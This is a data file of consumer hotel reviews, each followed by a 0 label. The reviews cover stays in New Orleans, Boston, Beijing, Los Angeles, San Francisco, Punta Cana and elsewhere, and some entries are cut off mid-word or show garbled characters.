"reservation refund problem i am a very frequent traveler and have never had to work so hard to get a deposit returned. after booking a stay at this property i was charged a one night deposit (typical for a new years stay in nola) but ultimately i had to cancel my reservation (and this was done several weeks before the deposit forfeit deadline). the deposit was keyed in manually (not through an automated process) within 48 hours of making the reservation. the problem arose when i tried to get the hotel to refund my deposit. it took almost six weeks and four phone calls (the fourth call being to my credit card company) to get the deposit returned to my credit card, which is totally unprofessional and unacceptable. and who can say whether i would've ever gotten the refund if i hadn't called. the staff members i spoke with each time were pleasant about the situation--no complaints there--but they were completely ineffectual. ultimately after being told three different times that it would be taken care of (...we'll take care of that immediately sir...i'm sending this to accounting again sir...i'll bring this matter to the gm's attention myself sir) i finally filed a dispute with my credit card company to force them to return my money...which seems to have done the trick. this clearly shows how interested they are in customer service and it's a shame because i visit nola often and would've considered staying there in the future, but i would never stay there now, not at any price.",0

"won't ever come back first, the positives... we arrived at 10:45 a.m., and they had a room for us shortly. the people at the desk were friendly and helpful.now the negatives... after inching our way through terrible boston traffic, the parking garage was full, so we parked a couple of blocks away and walked through the rain to the hotel. the room, at $169/night, is small and tatty. the bathroom is a knee-banger. there is a deionizer/heater running in the room, possibly to remove smoke odor. there is broadband internet connection, but if you're on the fifth floor as we were, expect a very weak wifi signal. supposedly you can hard-connect, but the receptacles in the room are the old style telephone connectors - no ethernet receptacles and the hotel doesn't furnish cables like many. don't count the nearby galleria food court as a plus; it's a cattle stampede at noon. lest you think we're just overly-critical, we stayed at two wonderful chain motels on the way to this one, and reviewed them both positively. parking, by the way, is $18/day, free at most motels.bottom line, if you're a patient at one of the many area hospitals, perhaps you don't care about any of this. but if you're in boston on business or pleasure, take a pass. find a chain motel outside the inner city where the expense is less and there are more amenities.",0

"A wonderful hotel A wonderful hotel for business travelers. I have stayed there for 3 nights and attended a meeting held there. The hotel is centrally located in the Financial Street of Beijing, known as the é¥?·²all Streeté¥?in China. It will only take 1 minutes walk to get to Chinaé¥??? é¥?·©egulatory Commissionsé¥?for banking, insurance and securities. This is especially convenient for people like me whose business is finance related. And cabs took 15 minutes to get me to the National theatre which is just next to Tiananmen Square. And I just noticed some giant finance companies are just located around the hotel, like Citi, GS and JP Morgan. The shortcoming for this is you can not easily get cabs in the rush hours in front of hotel. The room is great and well equipped. I personally like the huge Westin é¥?·eavenly Bedé¥?and the so-called rainforest shower. The most important point is the whole hotel is covered by wireless internet broadband, and it is free. I can easily go to surf internet when I was in a meeting and the wifi signal is strong in the venue. Staff is very friendly and their English is adequate. Every evening they have a ceremony down in the lobby showing some candle lightening up and Taiji show. However, the main corridor of the lobby is under construction and I suppose the ceremony should be better with a nice corridor. We used buffet in the restaurant in the 1st floor and found it is very busy in lunch time. We have to wait for a while to be seated when we tried to have a quick lunch there. Honestly, the food presented is among the best ones I have seen in Beijing. Staff in restaurant was very proactive and they even taught me some pronunciations in Chinese. Overall, Westin Beijing Financial Street is one of the best hotels in town with no doubts, especially for business travelers. I will definitely recommen",0

"everything you could hope for my friends and i do a road trip to a different nfl venue every year. this was a great place to stay in seattle. we like to hit up a few tourist spots in addition to the stadium itself and this hotel proved the perfect location to accomplish that. it's within easy walking distance of the space needle, pike place market, and basically anywhere downtown. if you have no problem walking, you can even walk to the stadiums with little issue (45 minutes, maybe?), which we did. as for the hotel itself, it's been recently remodeled so it's very clean and modern. the bedding was the most comfortable i've experienced in recent memory, and the breakfast is very legit (it's beyond a continental breakfast but not quite a real breakfast). the price was a ridiculous bargain ($75/night) but this place was so perfect for what we were looking for, i would've been happy if i'd paid $125. the staff was very friendly, great location, outstanding pricing. it's the dream scenario for a budget traveler looking for the ideal location, but it has enough frills that even a more high maintenance individual would be more than happy.",0

"overpriced for the location wy ife, daughter and i stayed at the hilton for 3 nights in december and the hotel was fine but pricey for the standard of accomodation / amenities. it wa ideal for universal but you can do universal in 1/2 days so there really is no need to stay that close to it - we paid the same rate through expedia as we did for the bellagio in las vegas - need i say more!the rooms were clean enough and there was no traffic noise even though it is right next to an 8 lane freeway. the shuttle to universal is good and comes every 15 minutes or so, and universal citywalk has some good shops / restaurants.all in all it depends on what you are planning to do in la and if you are also visiting beverly hills etc id suggest staying somewhere nearer there and just driving / taking a cab to universal as this hotel is nothign special.as i used tripadvisor to book all our hotels i thought i should share this with you - basically the tripadvisor reviews got it right in all of the hotels we stayed at!",0

"Best Vacation Ever! My husband and I spent another wonderful two weeks at the Riu Palace Punta Cana from April 26 to May 10, 2008. I can't believe the whining and complaining about this most beautiful and magnificent resort on the most spectular beach we've ever been to in our many trips to other sunny destinations. Yes, we did have two days without hot water, but it's hardly a horrific experience and the water was cool, not freezing; hardly necessitating an exit from the resort. Two days was not an eternity and vacation experiences are what you make of them. If you continually dwell on the odd negative event which may occur, it will ruin your holiday. Some things happen which are out of the control of the resort and if you want perfection, stay home. There will always be an odd glitch or two once you leave your home and head off to visit a new country or island.Yes, people did have to line up for the specialty restaurants at 9:15 a.m. but the process moved very quickly and it's the best way to ensure people will actually turn up for their reservation and not leave tables empty and prevent others from enjoying the excellent and diverse restaurants. We always got the specialty restaurant of our choice and spending a few minutes in line to do so was definitely worth the brief wait.The staff at the resort are very friendly and helpful and there is always someone at the reception desk who can converse in English since many speak several languages. We've never had any problems in the 18 times we've been to the Dominican and we're unilingual English. The staff seem very happy to be working at the five Riu resorts and try to accommo",0

"pure bliss stayed here march/april 2005 w/ our 3 children....this hotel is extremely clean, friendly and had the most comfortable sleeping arrangements i have ever experienced in a hotel. we have stayed many places including ritz carlton's in other cities. crown plaza was top notch! we had a 2 room suite on the 12th floor...paid 200/night...had fridge, micro...and rooms were incredibly quiet! this hotel has what they call a sleep advantage program. upon arrival you find an entire relaxation kit on your bed complete with cd (a nice player in room), lavender spray, eye mask, and ear plugs....we never used ear plugs of course as rooms were soo quiet! each room had own temp control unit and worked very effeciently....room service food was outstanding and on time. breakfast buffet was an ample spread and had a european flair with fresh deli meats on it and yogurt with real fruit in it was always available--a hit with the kids. the pool could have been warmer, but the kids did not care and we really weren't there to swim anyhow...the hot tub was perfect though! as far as walking distance to attractions, i would not stay here if you don't want to walk. we drove everywhere--rented an expedition thru budget for $230 for whole wk! the hotel has a rental car business in it but very expensive. ($79/day for a sequoia) overall, this was the most comfortable hotel i have ever been in. maid service was impeccable and i am going to miss those pillow top beds....(my own at home isn't the same!) oh-one more thing--the hotel has a convenient little pantry right in the lobby... gifts, snacks, medications, pool toys...most items were pricey of course being in the hotel, but ohhh how convenient when we needed a beach ball for pool fast! and we only paid $2 for it! definately reccomend this place to business travelers as well as families alike!",0
kids love this place! this place was a lot of fun!the kids had a blast at the river ranch.........we managed to get three days use out it-friday afternoon to sunday morning........they also give you the option of late check-out for an extra 35$-i would recommend this! that lets you enjoy the river ranch for an extra 3 hours........the room was nothing to scream about....in fact-the first night was awful!the beds were saggy and lumpy and it was noisy! i went to the fromt desk in the morning and asked for a more comfortable room-we were moved to the 3rd floor-the beds were much better! saturday night is a nosiy night there so if you go-be prepared for noise!also-we bought the resort package for an extra $9 per day-we got to use the gym(nice!) and paly mini golf-cute course winding around the lazy river........i would go back-the rooms are affordable and the kids loved it!,0

"hurry up and wait at the roosevelt the roosevelt is known for being a bit of a hollywood scene (or at least it was a year ago) which does not interest me, so i wouldn't have stayed there had it not been for a good deal through a business associate. but i was intrigued to see the property.first of all, arrival is a nightmare. the valets were so behind on a saturday afternoon that traffic was backed up all the way down the side street next to the hotel. after waiting for a minute i swung around and parked on hollywood boulevard. the line at reception was 20 people long, and took forever -- one gets the feeling the young women working the desk were not hired for their brilliant interpersonal skills.over to the elevator, and there's a crowd there as well. one of the two elevators is broken, and people are waiting up to a half hour for a lift. finally making it to the room, and yes, it's nice -- due to a problem with the reservation i've had to get a nicer room (long storyand not the hotel's fault), and it's quite the space -- two bathrooms, a sitting area, all very well designed, a step up from thecheese-modern standard. but then i open up the laptop to get some work done and the complimentary wifi is barely functional -- a website takes 5 or 10 minutes to load, if it loads at all. it was like that all weekend.i went to check out the fitness center, but even though it was mid-afternoon, it seemed closed, and very small. the party scene around the pool was amusing (if a little crowded for someone just interestedin a swim). every girl was a hollywood proto-starlet, every guy was a steroid-enhanced dude in a baseball cap. getting my car back, even though it was parked right there in the parking lot, was a nightmare -- a line for the valet window, then a giant crowd of angry people outside, and it took about 45 minutes. i learned quickly to avoid hollywood boulevard which was always snarled with traffic, and just walking to the hollywood and highland mall to buy a swimsuit was a challenge. again, the room itself was lovely, with a large bed and a great shower with nice soaps and stuff. rowdiness on lower floors (and especially around the pool) seemed like it would have been a nightmare for anyone wanting to sleep, but i didn't have a noise problem, other than the deafeningly loud fan that i couldn't figure out how to shut off until i called the front desk the next day (hint: it was the giant switch in the circuit breaker). so, if i was paying full price, i'd never, ever stay here again. while the infrastructure and design is nice, the service level is nonexistent, and every aspect of the hotel is geared towards a scene not a happy traveler.",0

"hot ,noisy, dirty but food is good according the hotel, in the fall season the air conditioning has to be turned off to be ready for winter. unfortunately the conference participants staying in the hotel were not informed of this fact. the weather was in the 80's during the day and our room was 85+ at night. a few fans were given out but the only window in our suite faced the busy street on the ground floor and had no screen. we requested a room change but were told none were available. repeated complaints to the front desk resulted in several free meals at the restaurant- which actually was very good and, oddly, airconditioned unlike the rooms. nothing was done about the room temperature or the screens or the fan which fell out of the open window.a month after our stay there was an expose on good morning america of the cleaning practices at this hotel. they showed cleaning staff wiping floors with used towels and then using the same towels to clean drinking glasses. it wasn't that surprising after our stay.",0

"hotel, shmotel royal? are you kidding? we notified the desk we wouldn't be arriving until 2am b/c of the drive. upon arrival, our reservation no longer existed. granted, the weary, kind woman at the desk made sure we did have a room. the room was huge, but seriously unclean. saggy beds, dirty couches, dirty floors, scary bathroom... they did give us our last night for free and moved us to a nicer room. again, promising a 3 person jacuzzi hot tub, as they did before. note to hotel writers... a garden tub is not a 3 person jacuzzi hot tub. i just want to understand how hard it is to loose reservations or book a decent, clean room. we didn't even have to pay the full rate... if we did, well, it wouldn't have been pretty. at least community coffee was right across the street, and we were pleasantly woken each morning by the clippity-clop of the horse-drawn carriage tours. wonderful area, dubious hotel.",0

"great hotel, great location my daughter and i stayed at this hotel during april 2006. as we were travelling alone, safety was important to us and this hotel was situated in a busy area so we had no problems there. we found all the staff to be very friendly and helpful and we were able to check into our room slightly early. we had a 2 double bed room and were very pleased with the size and cleanliness of the room. it was overlooking the street so a little bit of noise from there but nothing to worry about. with regard to location, couldn't get any better as it is only about a 5 minute walk to the hollywood walk of fame. we took advantage of the free hotel shuttle bus to universal studios on the saturday and on sunday did the movie stars home tour which is definitely worth doing just to appreciate the other world that they live in!!!! we didn't see as much as we were hoping to as the tube system is not very good and the buses not particularly direct so a car would have been handy (but then again, wouldn't have wanted to drive there!!) overall, very pleased with the hotel and would definitely stay there again.",0

"Spirit of True Aloha After a less than stellar experience at another budget hotel on my last visit, I decided to try the Ocean Tower. I normally stay at budget hotels in Waikiki, but have stayed at many hotels on the mainland, usually in 3 star, sometimes in 4 star and a 5 star on one special occasion.The service I experienced by all of the staff, from the front desk to housekeeping, was phenomenal. In my opinion, this isn't a case of service that is above expectation based on the price of the room, but a case of a group of people with genuine care for you as a guest. I would say they value your patronage. This is something that many service industry workers have forgotten, especially workers that know they will only be seeing you for that 1 week in their lifetime.I stayed in an older room with a view. I was offered a remodeled room without a view, but chose the older room due to all the 'new' smells. I didn't think my sinuses would handle it. Yes, the furnishings were a bit ",0

"awful! we booked this hotel because the boston college website listed it as a local place to stay. we planned on staying two nights and we had booked two rooms at a rate of $169.00 per night. when we arrived my husband commented that it looked like the bates motel. once inside our room - we were horrified. the room had been decorated in the 70's and had never been updated. it was extremely shabby and the bedspreads and carpet were stained. worst of all was the disgusting smell of smoke and stale air. it was so bad that we told the front desk clerk that we didn't want to stay there - the clerk informed us that he may have to charge us anyway. we told him fine, knowing that we would stop our credit card payment and make a formal complaint against the hotel. our trip to the boston area ended up lovely. we checked into the doubleday suites and were very happy there. the rate at this hotel was actually less expensive because a two room suite was $199.00 and accommodated our family just fine. the bottom line is don't stay at the best western inn in boston. there are so many other options of great places to stay!",0

"not the quality i expected stayed at the hotel the evening of november 19, 2005. i used marriott points (30,000) and my wife and i were disappointed in a variety of different ways. the room was adequate, but we were unable to regulate the air conditioning system, thus even with the windows open, the room was uncomfortable. upon check out, the desk clerk advised us that the range of temperature in the rooms is controlled, as to not affect the adjoining rooms. the bathroom had a sliding door, and the wash area only had one sink and limited electrical outlets. the valet parking fee was just under $50.00, steep for even sf prices. the morning coffee service was a nice feature, but certainly didn't make up for the other deficiencies. we would not consider this property for future stays.",0

"totally gross and cheesy let me first admit that i'm giving this an ok rating due to the fact that my wi-fi worked and had a great connection. now when i walked into my room, it just looked awful. super cheap comforter, awful appliances, really dusty and gross closets, and that unsure feeling of should i really walk on the carpet?. and to make sure i wasn't thinking this myself, my co-worker who i traveled with had all of this, plus a horrid smelling room. ok so it is clsoe to the t train, but it is very hard to find while driving and it isn't really worth finding. all in all this hotel is fine of the rooms are going for $39.99 a night, but for $125, you could at least get the musly smell out of the room!!! first time here and the last time for sure!",0
"better than expected. so basically the hotel is situated right across from the main strip of kuta beach, this is one of few hotels that have this sort of location. at the time i thought this would be a big bonus however, i found kuta beach to be awful, not cause it was busy (i love waikiki beach), but because its full of people asking you to buy stuff and its really not a great beach anyway. seminyak much better. however the view at the pool is spectacular, can't be beat.i saw alot of reviews on here expressing disappointment in the breakfast. not sure what people are expecting, but basically its got everything you would want and its all good quality. fruit, breads and sweet breads, cereal, bacon, eggs, omelets, sausages, beans and a wide selection of asian dishes. i thought it was pretty good. not the best i've had but you certainly wouldn't complain about it.rooms are average. look a little cheap and basic but its modern, clean and functional. i didn't see a problem with air quality in the room and the air conditioner worked well. t.v had 55 channels but was a little out",0

"Loved the Resort, Not the Food We were two families with three kids ranging from ages 10 to 14 years old. We stayed at Dreams Punta Cana March 16 to 23 inclusive.We all really liked this resort, the layout was great, never felt we were too far from anything. The pool was fabulus the 11 and 10 year old loved the iceberg in the first pool.  Chairs were at a premium, especially as the beach was closed for three days due to rough water conditions and it was Holy Week. We never did have a problem securing chairs, however we were at the pool usually before 7:30 am, and someone sat with the chairs until 9am. The resort has instituted this practice that you cannot reserve chairs prior to 9am, unless you occupy the chairs. We did see the security guards removing towels and peoples belongings if the chairs were unoccupied prior to 9am. This practice was not well communicated, and we learned of it through word of mouth. The resort should post these rules in rooms on on the palapas around the pool, so everyone is aware. There were some unhappy and distressed guests when they returned to their chairs and their belongings were missing. I tend to be more than underwhelmed by the food at any AI we have stayed in, and this resort was no exception. While I did not go hungry, I thought the food bland and a tendency to be overcooked. We ate a virtually all the restaurants, and the only real wait we had was at the Oceana, which was also my least favourite meal.We thought the staff at this resort tremendous. The staff went over and above to accommo",0

"nice hotel stayed at this hotel on the final leg of our road trip through california and nevada and was not disappointed. booked two queen beds on executive floor and were allocated a room overlooking the pool area, large, clean with nice evelyn and crabtree bath products with complementary breakfast and appetisers after 5.30pm and complementary fruit basket (in fact we received a second basket after 3 days stay). nice pool, never too busy. ate in the sierra cafe for the weekend buffet....fabulous if you like seafood and reasonable at $39.00 per person especially if you have large appetites. very convenient for universal studios and citywalk (for every type of meal). did'nt bother with the hotel shuttle, the walk was about five minutes away over the pedestrian walkway and invariably we arrived there before the shuttle did. when there if it interests you try the warner bros vip tour.....great fun and a different experience from the universal studio tour, you can get tickets from warner bros online. if you want to do the tour of the star homes thing, try starline also online but we picked up tickets from a kiosk outside mann's chinese theater, also great fun. all in all a typical hilton experience and recommended.",0
"loved the omni i loved being here. this is a 4 star hotel, and it was a great experience. everyone was very accomodating.our first room had a view of the fountain - unfortunately in the afternoon i smelled cigarette smoke coming up through the air vents - it was not in the hallway, so it was not neighbors. i phoned the desk and we were immediately moved to another room. that room did not have a great view, and still had a sort of stale cig smell, so we moved again, back to the original floor, but, a corner suite, with fantastic views, and no cigarette smells whatsoever.from the moment we arrived, charlie helped us out (make sure you tip everyone btw, bring dollars and fives, or more if you wish), we were treated like royalty. the maids were super sweet, the receptionists were great, the staff was amazing. chocoalates and ice came in the afternoon as well as turn down. wifi (make sure you sign up as a select guest on their website so you can get that free).there's in and out service with the parking system, so you are only charged for parking once a day.the bathroom is big - separate shower and bath. i asked for extra towels daily from the maid, she did this daily, without us asking which was great. btw, the maids that we had were wonderful.one night we were at a restaurant and called for the courtesy car to take us back.couldn't be happier! great place to stay!oh and the manager sent us up fruit and an apology about the other two rooms, so we were very very happy.almost forgot this, we asked for a refrigerator for some of our personal things, and we had that in the room - no charge.there was also daily shuttle service to the convention center.can you beat that? nope!",0

"convenient airport hotel the sheraton park n' fly is the reason i stay here (lax marriott has the same program), that and my spg points. i like the hotel, it is convenient for the airport, the pool is nice and shula's is good, but overpriced. the rooms are nice and the beds comfortable and they have good business services.all good so far.the negatives are the parking and the elevators. you have to valet unless you want a half mile walk for self parking. the elevators have been messed up for a while now. they are so bad you have to use the staff elevators more often than not and it has been this way for a while.will i stay here again? yes. it has some good positives. it is a great hotel for someone looking for an overnight stay or maybe two days. if you have to been in l.a. more than two days there are a lot better places to stay and better locations.",0
"this hotel has only one thing going for it -- location this hotel has unattractive, small, dark, standard rooms. the windows do not open and the antiquated, noisy, climate control system can not be regulated well. expect blasts of cold air or heat all night long, depending on the season. no toiletries are provided other than soap and shampoo. service was indifferent, with the exception of one hospitable cleaning person. the reservation for one of our two rooms was lost because our name was spelled incorrectly. the reservation confirmations do not have a reference number on them unless you request one. fortunately, i did so and was able to help retrieve the lost reservation by providing the number. three requests to speak with the manager received promises of return calls, but no action. absolutely no reason to stay here other than its proximity to several major hospitals.",0

always a pleasure i visit san francisco twice each year and always stay at stanford court. the rooms vary - some are really wonderful but the others are fine - they are all in good order and well appointed. it is delightful to get your morning tea/coffee with your wakeup call and the staff is uniformly helpful and professional. my friends and i particularly like to have a first cocktail in the lovely lobby bar and the doormen and valets are always quite benevolent to my friends in terms of parking briefly in the lot right in front of the door. the location can't be beat. i wouldn't consider staying anywhere else!,0

"terrible service, room smelt of smoke i would never go back to this hotel. after 3 weeks of excellent hotels and service on the sunshine coast in queensland we were dropped back down to earth when checking in. first of all, we booked 2 rooms as there were 4 of us, when checking in they had us down for 1 room, 2 double beds (1 being a settee). we argued and argued with different people until they agreed to put us in two separate rooms (no apology or anything). then one of the 2 no smoking rooms we were given smelt of smoke. not just smoke but fresh smoke. the carpets in both rooms were also stained and needed a good clean and the shower in 1 room was not working properly. it seems that with this hotel if you a business prerson they accomo",0

"couldn't be more satisfied i stayed for 4 nights in late august. i got this hotel through a package deal. i have to agree with those that gave the hotel great reviews. i utilized the online check in and our keys were waiting for us upon our arrival allowing us to bypass checking in with the front desk.like others, i highly recommend signing up for the select guest program; the complimentary beverages in the morning are a nice way to start off each day. and the turndown service is a nice way to end the day.amy, their concierge was top notch. she was very helpful with suggestions and providing directions to places we wanted to go and she did this without us having to ask. and while it was $30/day, i wasn't too upset because frankly we were on vacation and that's come to be a normal expectation and they were quick and prompt; we never had to wait long for the car.on the last night, we weren't getting any hot water and i contacted the front desk. upon our return from the evening out, the front desk manager gary informed us that the problem was still not fixed. taken proactive measures, he gave us access to another room to take a shower the next morning and comped up 2 days' parking for the inconvenience.last but not least, it was in a great location, with easy access to the i-101we stayed at the omni san diego as part of our trip as well and there is no comparison; omni la at california plaza's service lived up to it's four-star rating.",0

"what a waste of a beautiful hotel this hotel is beautiful and charming and classic. the rooms itself were beautifully furnished, especially the ground floor suites with the cabanas. other than that, my experience with the roosevelt hotel was poor. the staff did not seem to care that we spent money to stay at their hotel. clearly, whoever was famous or somebody trumped all guests. service is very important to me, especially from a hotel. all we encountered was an unhelpful, inept, unwilling, and infuriatingly, unapologetic staff. it took almost half an hour to check in because there was only one person at the front desk, in a very loud lobby. friday evenings are a nightmare at this hotel. check-in means averting the throngs of hollywood scenesters and starlets who are clamoring to get in to tropicana. paying hotel guests, however, have no access whatsoever to the pool that they so lovingly advertised online. i left feeling disappointed and even worse, robbed.",0

"enjoyable stay at the tuscan inn my family and i stayed at the best western tuscan inn for three nights this past june. this hotel is above average for a best western. the rooms were clean, nicely decorated, and comfortable. i did not have any issue with noise; the air conditioning units were not quiet but i didn't find them bothersome. we had no noise from the street. i don't remember our view- we were basically just in the room to rest up for the next activity. the location of the hotel was within easy walking distance of fisherman's wharf and ghiardelli square. cable cars, trams, and muni buses to various parts of the city were within 1 to 2 blocks of the hotel as well. the service was fine with the exception of check-in. we made our reservations several months ahead of time and requested two adjacent double rooms as my husband and i were travelling with our two teenage daughters. they gave us two rooms on the same floor but on opposite sides of the hotel. since our daughters are older teenagers, we accepted this arrangement. a couple of years ago it would have been a deal breaker. we've gone many places and made this request and this hotel is the first one that did not put us within a couple rooms of each other. from reading other reviews, it seems as though this hotel has significant lapses in service from time to time. nevertheless, i did like this hotel- the rooms, location, and most of the service and i would stay here again.",0

"loved the bed! my colleague booked this hotel for a convention at the la convention center. and i think she paid about $130 per night from fri - mon, 3 night stay.the entrance and lobby are relatively small, but i think it's typical of hotels located in busy business district like downtown la. since we stayed there on the weekend, there were several parties/events/gathering at their meeting facility, and the lobby/entrance staffs seemed more busy accommodating them over their hotel guests.our room was on 17th floor, which had a lounge area where they served daily continental breakfast. they also served complimentary wine and some snacks in the evenings and the room had 2 internet ready computers for the guests for free.room was very clean, simple, and modern. i really liked their bed, mattress, choice of pillows, and a down comforter especially since i am somewhat particular about my sleeping environment.the hotel is located in a strange spot. there is nothing else around the hotel that i was willing to walk to at night. we always took a cab to get to places like a sushi restaurant in little tokyo, california pizza kitchen, and roy's. cabs were hard to get to find our way back to the hotel on weekend nights.overall, it was a nice stay. i might find a hotel that's closer to stores/restaurants on my next visit. things might have been very different if it weren't for the weekend stay.",0
"disappointing stayed here four 4 nights in mar 06. great location near sights but there is road noise and the walk to the main sights was a bit dodgy. i was disappointed with this hotel after staying at two much nicer holiday inns on my trip (heathrow and san francisco). the bell boy was annoyingly pushy, breakfast staff rude and the hotel in need of a bit of modernisation (leaky taps, noisy air-conditioning even when off, dated decor). also, the breakfast itself was not very good. it was the only place on our two week holiday that we tipped the minimum 15% and that was because it was automatically added to the bill. there were also groups of teenagers staying when we were there, who ran through the corridors and slammed doors noisily late at night. didn't have any of the perks of the san francisco hotel - no breakfast included, expensive water in the rooms (although it was available for half the price in the vending machines), no free internet access, local calls charged. small things and worth putting up with if you get a really cheap deal but it all added up to a feeling that staff looked on guests as more of a nuisance and money-grabbing opportunity than a customer. then came home to find i'd been charged for the rooms on my credit card despite having already paid through thomas cook. two weeks later i'm still waiting for the promised refund to show on my credit card. my compliments go to the reception staff and evening restaurant food and staff. however, overall, i would not recommend this hotel.",0

"nice hotel my finance and i stayed at the holiday inn hollywood recently and overall had a very pleasant stay. the hotel is quite well located, although not as close to hollywood attractions as say the renaissance or roosevelt hotels, which i have stayed at previously.the service was friendly and efficient, and our room was clean and quite spacious, although some of the fittings (especially the lighting) were dated and probably could be replaced. our room did not have a fridge, and although an ice bucket was supplied and complimentary ice was provided on each floor, having a small fridge would have been convenient.this hotel is about a 5 minute walk to hollywood boulevard and there is a great market and a starbucks right across the street and an internet cafe is very close by.we had an excellent stay here and we would certainly recommend this hotel, but next time we will probably try and stay somewhere right on hollywood boulevard again.",0
"Fabulous Convention Center Hotel! The organization I work for will be hosting their 2007 annual conference at the BCEC, the convention center attached to the Westin Boston Waterfront. I was looking forward to staying at the hotel and was not dissapointed. The property is beautiful, with very sleek, modern decor. Check-in was a breeze. The Heavenly Bed is truly heavenly. I love how easy it is to walk from the hotel to the convention center. On my last day at the Westin, I needed a late check out so that I could meet with the Events Manager at the BCEC. They were more than happy to accomi",0

"Great resort, but needs some work This is a gorgeous resort but it does need to work on a few really important factors.The food there is good. It is somewhat lacking in variety and the staff can be unaccomadating or unusually strict. Definitely check out the restaurants. The French is very good but make sure to dress appropriately, the other restaurants are all good but I'd recommend getting there earlier as the food  service is generally better. The bar on floor zero of the lobby is the place to go if you want a good drink.The entertainment is excellent. Look for Walter, Melvin, Mariel, Teresa, and Ivelica- they are the dancers  hosts  really make an effort to get to know the guests.

"a nice place to stay i stayed at the roosevelt for two days in september 2004 and found it to be a pleasant hotel in a good location. check-in was efficient and i was offered a choice of rooms. being from way out of town (8,000 miles out of town), the lady was very helpful and suggested a room on the eighth floor (quieter up there) with a view across hollywood boulevard. the room was bright, spacious, modern and comfortable, with plenty of storage space, walk-through dressing room, safe, and nice touches like a coffee percolator. it felt clean and was serviced unobtrusively. my travel agent who booked the room in june told me in july about the renovations and closure of the pool, and they were not a problem. if i'd wanted to use a pool they offered an alternative hotel nearby. i had dinner one evening in the restaurant and, apart from the standard american propensity for rushed meals, it was a pleasant experience - interesting food, friendly and helpful service, a good wine list, and the historic ambience. the only negative experience was on the final day. i'd had my bags collected and stored in the morning, spent a great day at universal city, then returned to the hotel to pick up my bags and get a taxi to lax. i think the desk man must have had a deal going with a company on another planet because once he'd phoned for the taxi he made no effort to get my bags, told me there was no hurry, and got on with his work. meanwhile i watched plenty of empty taxis cruise past the hotel while i waited 40 minutes for mine to arrive. when we got to lax the driver seemed lost and had no idea where to find the correct terminal. an unfortunate end to an otherwise pleasant stay at the hotel.",0

"good central location my colleague and i stayed here on business at the end of july. we booked a twin room through virgin holidays and on arrival were told that we had a double room and they couldn't move us as it was a busy time and there were no twin rooms available. we accepted this as not the hotel's fault i guess. we couldn't book another room as the hotel was full so they put a extra single camp bed in the room, but it was very cramped as the rooms aren't very big! our colleague arrived later and she had the same problem and she booked direct with the hotel! however, they said they could offer her a twin room the next day so not sure why they could for her and not for us, even though we offered to pay extra.......???the rooms were nicely decorated and the bed was very comfortable. we were also on the quiet side of the hotel which i would recommend asking for as the surrounding streets are quite busy. the hotel is in a good central location and within walking distance of the main shops and exhibition centre, which takes about 15 minutes.the breakfast has a good selection but we very rarely got what we ordered and it is quite expensive!they offer free coffee/tea in the mornings which can be ordered with or without a wake-up call the night before. we ordered tea with no wake-up call, but sadly got woken up and no tea!! the concierge is helpful for booking trips but don't listen to their restaurant recommendations as we got sent to an awful place in chinatown! good places to eat are nob hill cafe and venticello - both italians within walking distance. the bar in the hotel next door (top of the mark) is good for a pre-dinner cocktail, as is the bar at the top of the marriot hotel downtown. trips worth taking are alcatraz (popular so book well in advance to get the day you want) and the wine country tour to the nearby napa and sonoma valleys. if one of your group doesn't mind driving, you would have more freedom to choose the winerys you want to visit though.san francisco is a great city but 5 days is probably long enough to do everything! also, bring a jumper as the weather gets cold quickly when the fog comes in!",0

"A great family getaway Travelers: Six adults ( two seniors) and two children ( agers 6 and 3)This was our second trip to the DR but the first w/ the kids. The trip was booked through Costco travel and we chose this resort because of its all-inclusive package which allowed kids under 12 to stay for free. We flew on American and arived in Punta Cana around 1pm local time. The pkg also included roundtrip transfer, but the shuttle service made stops at three other resorts and so what should have been a 30 minute drive ended up being over an hour which was mildly annoying, but not awful. The entrance to the resort lobby is breathtaking. A very grand and expansive lobby area leading to a descending staircase to an elegant bar and lunge area that leads out to the grounds. The property is beautifully landscaped and despite its size looks and feel comfortably intimate.The staff is professional and welcoming from the moment you step into the lobby.

"great find booked chelsea lodge after seeing it had won a tripadvisor award.it is a short walk from the subway (either 23rd or 18th, both on the number 1 line). the hotel is in a quiet, leafy street, between 8th and 9th avenue. while it is in a quiet area, you are no distance away from the sights of new york - it is a great base.our room was upstairs. while it was small, it was adequate. the tv was modern, with many channels. the bed was very comfortable, and we were very glad to have an air conditioned room. the toilets were across the hall, and were always available.the only draw back was the shower in the room. there was no 'drying' area - so once you stepped out of the shower you were standing in the bedroom.overall, i would recommend chelsea lodge to anyone wanting a cheap, but very clean and charming hotel.",0

"great hotel!!! my sister and i stayed at the tuscan inn over the weekend. it is a great hotel - clean and comfortable. we had a courtyard view, and there was no noise at night. a lot of the people staying there were older and very quiet. i would definitely stay there again. it was a couple of blocks from the warf. the streets in san fran were filthy and the homeless people were scary, but the hotel was wonderful!!!",0

"Great Hotel I have to disagree with alot of the other reviews on the site as this hotel is a great find.Firstly, I got a real cheap rate which was the best deal in town.The hotel itself is brand new and has first class staff  service. They were really helpful. The hotel itself looks great.While a lot of people complain about the location but I think it one of its best features. Two blocks or so to the Metro or Tram in what is a SAFE area. Maybe a little quite at night but it by no means unsafe or anything to worry about.There is alot of construction going on within the immei",0

"ok stayed here for 2 nights due to location. it was ok, but not great. the room decor was modern, though it did not feel comfortable. there were many conferences going on, so the lobby was busy and noisy. and cold! the food at the bar and in the restaurant was average and a little pricey. front desk staff not knowledgeable about local info. parking fee was a little high, too, as was the internet fee. convenient to lax, but other than that, nothing to write home about.",0
"satisfactory took a vacation to san francisco july 19 - 22. adante hotel was where we stayed. it was a pretty small room but we were only there to sleep and take showers. for the budget, it was ok. the front desk clerks mark tony were very helpful. the free continental breakfast was not so good, could be better. had a problem with our sink but reported it to the maid and when we got back it was fixed. i had nightmares about the noise but we were put in the back on the second floor and it was very quiet. we even had our window open. i would stay again here when i go back to san francisco. very convenient to everything.vangie f.,georgia",0

